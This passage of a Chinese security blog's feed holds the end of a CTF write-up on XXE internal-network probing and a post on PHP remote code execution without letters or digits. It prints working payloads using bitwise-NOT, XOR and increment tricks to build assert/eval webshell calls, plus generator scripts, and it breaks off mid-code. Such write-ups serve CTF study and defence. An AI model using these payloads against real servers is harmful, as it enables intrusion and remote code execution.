function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>测试读取<code>flag</code>，硬是没找到，无法命令执行，网上找了找<code>wp</code>，放心居然是内网探测，读取<code>/etc/hosts</code>的文件，读到本机<code>ip</code>地址<code>173.56.110.9</code>，于是探测子网：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "http://173.56.110.11" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p><code>173.56.110.11</code>，返回flag</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a></li><li><a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></li><li><a href="https://blog.blankshell.com/2020/06/09/xxe%e8%af%a6%e7%bb%86%e6%80%bb%e7%bb%93/">XXE知识总结</a></li><li><a href="http://www.suk1.top/2020/03/18/XXElearn/">XXE漏洞学习</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer-oRnOkvXS&quot; class=&quot;aplayer aplayer-tag-marker meting-tag-marker&quot; data-id=&quot;5174564734&quot; data-server=&quot;netease&quot; data-type=&quot;playlist&quot; data-mode=&quot;circulation&quot; data-autoplay=&quot;false&quot; data-mutex=&quot;true&quot; data-listmaxheight=&quot;340px&quot; data-preload=&quot;none&quot; data-theme=&quot;#ad7a86&quot;&gt;&lt;/div&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="xml" scheme="https://www.extrader.top/tags/xml/"/>
    
      <category term="xxe" scheme="https://www.extrader.top/tags/xxe/"/>
    
      <category term="xpath" scheme="https://www.extrader.top/tags/xpath/"/>
    
  </entry>
  
  <entry>
    <title>PHP无字母数字RCE</title>
    <link href="https://www.extrader.top/posts/a268445b/"/>
    <id>https://www.extrader.top/posts/a268445b/</id>
    <published>2020-08-09T04:22:50.000Z</published>
    <updated>2021-06-14T16:07:39.843Z</updated>
    
    <content type="html"><![CDATA[<p>CTF有时会碰到这种类型题，故在这里总结一下，日后有新的操作再补上</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_match(&#39;[a-z0-9]/is&#39;, $exp)</code></p><span id="more"></span><p>测试代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>php版本：PHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">echo urlencode(~&#39;phpinfo&#39;); (~%8F%97%8F%96%91%99%90)();  &#x3D;&#x3D;&gt;  phpinfo();echo urlencode(~&#39;assert&#39;);echo urlencode(~&#39;(eval($_POST[&quot;a&quot;]))&#39;);(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);  &#x3D;&#x3D;&gt;  assert(&#39;eval($_POST[&quot;a&quot;])&#39;)</code></pre><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124140760.png" alt loading="lazy"></p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>php版本：PHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 跑出非字母数字异或得到的 $str</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">;</span><span class="token variable">$exp1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$exp2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$k</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$exp1</span> <span class="token operator">=</span> <span class="token variable">$exp1</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$exp2</span> <span class="token operator">=</span> <span class="token variable">$exp2</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$exp1</span><span class="token operator">.</span><span class="token string single-quoted-string">'^'</span><span class="token operator">.</span><span class="token variable">$exp2</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">^</span><span class="token operator">%</span>a0<span class="token operator">%</span>b8<span class="token operator">%</span>ba<span class="token operator">%</span>ab<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>phpinfo<span class="token operator">==</span><span class="token operator">></span>  <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token constant">_</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span><span class="token constant">__</span><span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">27</span>a<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span>  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span></span>)"</span><span class="token punctuation">)</span></code></pre><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124757860.png" alt loading="lazy"></p><p>类似的</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"!((%)("</span><span class="token operator">^</span><span class="token string double-quoted-string">"@[[@[\\"</span><span class="token punctuation">;</span>   <span class="token comment">//构造出assert</span><span class="token variable">$__</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"!+/(("</span><span class="token operator">^</span><span class="token string double-quoted-string">"~&#123;`&#123;|"</span><span class="token punctuation">;</span>   <span class="token comment">//构造出_POST</span><span class="token variable">$___</span> <span class="token operator">=</span> <span class="token variable">$$__</span><span class="token punctuation">;</span>   <span class="token comment">//$___ = $_POST</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//assert($_POST[_]);</span></span></code></pre><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>  <span class="token comment">//两个短杠赋值为空</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//b</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//c</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//d</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//e</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//E  把两个短杠赋值为E</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//F  一个短杠继续自增</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//G </span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//H 此处一个短杠继续自增，为H</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//I</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//J</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//k</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//L</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//M</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//N</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//O</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//P</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//Q</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//R</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//S</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//T</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 进行拼接，$_GET['_']($_GET['__']);</span>url编码后：<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">.</span><span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">7</span>d<span class="token operator">%</span><span class="token number">5</span>b_<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27.</span><span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">7</span>d<span class="token operator">%</span><span class="token number">5</span>b__<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// $_='Array';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// $_=$_[0];</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// A</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token 